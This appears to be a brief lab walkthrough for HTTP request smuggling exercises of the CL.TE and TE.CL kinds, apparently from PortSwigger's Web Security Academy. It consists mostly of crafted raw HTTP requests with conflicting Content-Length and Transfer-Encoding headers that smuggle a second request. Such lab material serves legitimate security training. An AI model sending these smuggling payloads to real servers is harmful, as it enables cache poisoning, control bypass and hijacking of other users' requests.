### CL.TE 
Copy 2 GET request. Change request method GET to POST in first request. Add following things in first request.
```txt
Content-Length: 15
Transfer-Encoding: chunked

0

HACKED
```
Now send both request one by one and see error message in second request's response. 
### TE.CL
```txt
POST / HTTP/1.1
Host: 0a5100c4035607e984f33b25009300f5.web-security-academy.net
Cookie: session=yErlfd1VMHYJ0vU897293SwfIhZulBhs
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://portswigger.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
Sec-Fetch-User: ?1
Te: trailers
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

a8
GPOST / HTTP/1.1
Host: 0a5100c4035607e984f33b25009300f5.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 50

HMCyberAcademy
0


```
